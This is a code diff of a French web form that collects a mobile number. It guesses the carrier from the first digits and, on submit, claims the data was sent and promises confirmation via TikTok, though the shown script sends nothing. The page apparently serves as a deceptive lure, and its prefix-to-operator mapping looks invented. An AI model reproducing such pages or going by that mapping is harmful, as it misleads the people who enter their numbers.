@@ -69,7 +69,7 @@ line-height:1.6;
 margin-bottom:30px;
 }
 
-/* INPUT STYLE */
+/* INPUT */
 
 input{
 
@@ -98,7 +98,7 @@ color:black;
 font-weight:bold;
 }
 
-/* LIQUID GLASS EFFECT */
+/* LIQUID EFFECT */
 
 input:focus{
 
@@ -133,7 +133,7 @@ transition:0.3s;
 
 }
 
-/* FOCUS EFFECT */
+/* FOCUS */
 
 .phone:focus-within{
 
@@ -225,44 +225,6 @@ opacity:1;
 transform:scale(1.1);
 }
 
-/* VALID CHECK */
-
-.valid{
-
-margin-top:10px;
-
-font-size:22px;
-
-color:#00ff88;
-
-opacity:0;
-
-transition:0.4s;
-
-}
-
-.valid.show{
-opacity:1;
-transform:scale(1.2);
-}
-
-/* LOGO */
-
-.logo{
-height:22px;
-vertical-align:middle;
-margin-right:6px;
-}
-
-/* LOADER */
-
-.loader{
-margin-top:15px;
-opacity:0;
-font-size:14px;
-transition:0.3s;
-}
-
 /* SUCCESS */
 
 .success{
@@ -303,19 +265,13 @@ Veuillez saisir un <b>numéro français</b> appartenant à
 
 <span class="prefix">+33</span>
 
-<input id="phone" placeholder="6XXXXXXXX" oninput="detectOperator()">
+<input id="phone" placeholder="6XXXXXXXX" oninput="formatPhone();detectOperator()">
 
 </div>
 
 <button onclick="sendForm()">Valider</button>
 
 <div id="operator" class="operator"></div>
-
-<div id="valid" class="valid">✔ Numéro valide</div>
-
-<div id="loader" class="loader">
-⏳ Envoi en cours...
-</div>
 
 <div id="success" class="success">
 ✔ Merci, vos informations ont bien été envoyées, Merci d'attendre la Confirmation par Message sur Tiktok.
@@ -325,70 +281,80 @@ Veuillez saisir un <b>numéro français</b> appartenant à
 
 <script>
 
+/* FORMAT TELEPHONE STYLE iPHONE */
+
+function formatPhone(){
+
+let input=document.getElementById("phone")
+
+let numbers=input.value.replace(/\D/g,'')
+
+if(numbers.length>9){
+numbers=numbers.slice(0,9)
+}
+
+let formatted=numbers.replace(/(\d{2})(?=\d)/g,'$1 ')
+
+input.value=formatted
+
+}
+
+/* DETECTION OPERATEUR */
+
 function detectOperator(){
 
-let phone=document.getElementById("phone").value
-let op=document.getElementById("operator")
-let valid=document.getElementById("valid")
+let phone=document.getElementById("phone").value.replace(/\s/g,'')
 
-if(phone.length < 2){
+let op=document.getElementById("operator")
+
+if(phone.length<2){
 op.classList.remove("show")
-valid.classList.remove("show")
 return
 }
 
 if(phone.startsWith("60")||phone.startsWith("61")){
 
-op.innerHTML='<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg">Orange'
+op.innerHTML="🟠 Orange"
 
 }
 
 else if(phone.startsWith("62")||phone.startsWith("63")){
 
-op.innerHTML='<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4f/SFR_2014_logo.svg">SFR'
+op.innerHTML="🔴 SFR"
 
 }
 
 else if(phone.startsWith("64")||phone.startsWith("65")){
 
-op.innerHTML='<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/66/Bouygues_Telecom_logo.svg">Bouygues Telecom'
+op.innerHTML="🔵 Bouygues Telecom"
 
 }
 
 else{
 
 op.classList.remove("show")
-valid.classList.remove("show")
 return
 
 }
 
 op.classList.add("show")
-valid.classList.add("show")
 
 }
 
-/* ENVOI */
+/* ENVOI FORM */
 
 function sendForm(){
 
-let phone=document.getElementById("phone").value
+let phone=document.getElementById("phone").value.replace(/\s/g,'')
 
-if(phone.length<9){
+if(phone.length!==9){
+alert("Veuillez entrer un numéro valide")
 return
 }
 
-let loader=document.getElementById("loader")
 let success=document.getElementById("success")
 
-loader.style.opacity="1"
-
-setTimeout(()=>{
-
-loader.style.opacity="0"
 success.classList.add("show")
-
-},1500)
 
 }
 
